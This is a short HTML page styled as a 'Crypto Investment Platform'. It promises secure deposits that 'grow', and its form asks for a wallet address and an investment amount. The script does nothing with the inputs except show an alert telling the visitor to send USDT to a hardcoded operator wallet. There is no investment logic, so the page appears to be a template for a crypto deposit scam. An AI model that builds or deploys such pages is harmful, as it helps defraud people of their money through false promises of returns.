<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Investment Platform</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f5;
            text-align: center;
            padding: 20px;
        }
        h1 {
            color: #2c3e50;
        }
        form {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background: #27ae60;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background: #219150;
        }
    </style>
</head>
<body>
    <h1>Welcome to Crypto Investment</h1>
    <p>Deposit your funds securely and watch them grow.</p>

    <form id="investmentForm">
        <label for="walletAddress">Enter Your Wallet Address:</label>
        <input type="text" id="walletAddress" placeholder="Your Wallet Address" required>

        <label for="amount">Investment Amount (USDT):</label>
        <input type="number" id="amount" placeholder="Enter Amount" required>

        <button type="button" onclick="submitForm()">Invest Now</button>
    </form>

    <script>
        const adminWallet = "0xA0f1B31C650eBcb2E07CEf96174cee7197451c0e"; // Your wallet address

        function submitForm() {
            const userWallet = document.getElementById("walletAddress").value;
            const amount = document.getElementById("amount").value;

            if (!userWallet || !amount) {
                alert("Please fill in all fields.");
                return;
            }

            alert(`Deposit ${amount} USDT from your wallet to this address:\n${adminWallet}`);
        }
    </script>
</body>
</html>
